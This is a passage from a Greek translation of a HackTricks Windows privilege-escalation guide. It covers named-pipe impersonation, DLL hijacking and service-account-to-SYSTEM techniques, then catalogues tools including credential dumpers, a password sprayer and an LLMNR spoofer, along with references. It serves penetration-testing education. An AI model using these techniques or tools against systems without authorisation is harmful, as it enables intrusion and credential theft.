Η χρήση αυτής της τεχνικής συνήθως επιλέγει κάποια process που τρέχει ως SYSTEM με όλα τα token privileges (_ναι, μπορείς να βρεις SYSTEM processes χωρίς όλα τα token privileges_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από meterpreter για να escalate σε `getsystem`. Η τεχνική συνίσταται στο να δημιουργήσεις ένα pipe και μετά να δημιουργήσεις/καταχραστείς ένα service για να γράψει σε αυτό το pipe. Έπειτα, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το **`SeImpersonate`** privilege θα μπορεί να impersonate το token του pipe client (το service) και να αποκτήσει δικαιώματα SYSTEM.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρεις να **hijack a dll** που φορτώνεται από μια **process** που τρέχει ως **SYSTEM** θα μπορέσεις να εκτελέσεις arbitrary code με αυτά τα δικαιώματα. Επομένως Dll Hijacking είναι επίσης χρήσιμο για αυτό το είδος privilege escalation, και, επιπλέον, είναι πολύ **πιο εύκολο να επιτευχθεί από μια high integrity process** καθώς θα έχει **write permissions** στους φακέλους που χρησιμοποιούνται για το load των dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

Διάβασε: [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

Το καλύτερο εργαλείο για την αναζήτηση Windows local privilege escalation vectors: [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Έλεγχος για misconfigurations και sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Εντοπίστηκε.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Έλεγχος για πιθανές misconfigurations και συλλογή πληροφοριών (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Έλεγχος για misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες συνεδρίες PuTTY, WinSCP, SuperPuTTY, FileZilla και RDP. Χρησιμοποιήστε -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει credentials από το Credential Manager. Εντοπίστηκε.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spraye τα συλλεγμένα passwords στο domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh είναι ένα PowerShell ADIDNS/LLMNR/mDNS spoofer και man-in-the-middle εργαλείο.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασική Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζήτηση γνωστών privesc ευπαθειών (DEPRECATED για Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Απαιτούνται δικαιώματα Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζήτηση γνωστών privesc ευπαθειών (χρειάζεται compile με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Κάνει enumeration του host αναζητώντας misconfigurations (πιο πολύ εργαλείο συλλογής πληροφοριών παρά privesc) (χρειάζεται compile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά προγράμματα (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Έλεγχος για misconfiguration (εκτελέσιμο precompiled στο github). Δεν συνιστάται. Δεν λειτουργεί καλά σε Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Έλεγχος για πιθανές misconfigurations (exe από python). Δεν συνιστάται. Δεν λειτουργεί καλά σε Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο δημιουργημένο βασισμένο σε αυτή την ανάρτηση (δεν χρειάζεται accesschk για να λειτουργήσει σωστά αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει διαθέσιμα exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει διαθέσιμα exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να κάνεις compile το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δεις την εγκατεστημένη έκδοση του .NET στον host του θύματος μπορείς να κάνεις:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
